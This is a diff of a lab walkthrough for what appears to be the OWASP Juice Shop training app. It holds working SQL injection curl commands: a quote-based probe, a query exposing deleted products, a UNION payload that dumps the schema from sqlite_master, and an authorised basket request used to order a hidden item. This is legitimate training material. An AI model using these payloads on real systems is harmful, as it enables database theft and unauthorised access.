@@ -6,12 +6,9 @@ Resources
 
 ## Reconnaissance
 
-Intercept all requests with burp and look for a request with parameters to fuzz
+Intercept all requests and look for a request with parameters to fuzz
 ```bash
-# send to intruder
-#GET /rest/products/search?q=';
-
-# sql injection vulnerability
+# verify vulnerability
 curl -sS -H "Accept: application/json" "http://juiceshop:3000/rest/products/search?q=foo';" | jq
 # output
 {
@@ -28,25 +25,29 @@ curl -sS -H "Accept: application/json" "http://juiceshop:3000/rest/products/sear
 ## Order the Christmas special offer of 2014
 
 ```bash
+# find ProductId=10
 curl -sS -H "Accept: application/json" "http://juiceshop:3000/rest/products/search?q=2014%'+AND+deletedAt+IS+NOT+NULL));--" | jq
 
-# with firefox or burp edit and send a POST request with ProductId=10
-# http://box-owasp-juice-shop-0eruj:3000/api/BasketItems
-# {"ProductId":10,"BasketId":"6","quantity":1}
+TOKEN=<REDACTED>
+
+curl http://juiceshop:3000/api/BasketItems/ \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer ${TOKEN}" \
+  --data-raw '{"ProductId":10,"BasketId":"6","quantity":1}'
 ```
 
 ## Exfiltrate the entire DB schema definition via SQL Injection
 
 ```bash
-# Products table has 9 columns (see json above)
-# to fix "SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns"
-# add N static columns in order to match them
+# Products table has 9 columns, add N static columns in order to match them and fix
+# "SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns"
 curl -sS -H "Accept: application/json" "http://juiceshop:3000/rest/products/search?q=foo%'))+UNION+SELECT+name,sql,'a','b','c','d','e','f','g'+FROM+sqlite_master+WHERE+type='table';--" | jq '.data | map({"id":.id,"name":.name})'
 ```
 
 ## Log in with the (non-existing) accountant without ever registering that user
 
 ```bash
+# trigger error
 http http://juiceshop:3000/rest/user/login email=\' password=foo
 # output
 {
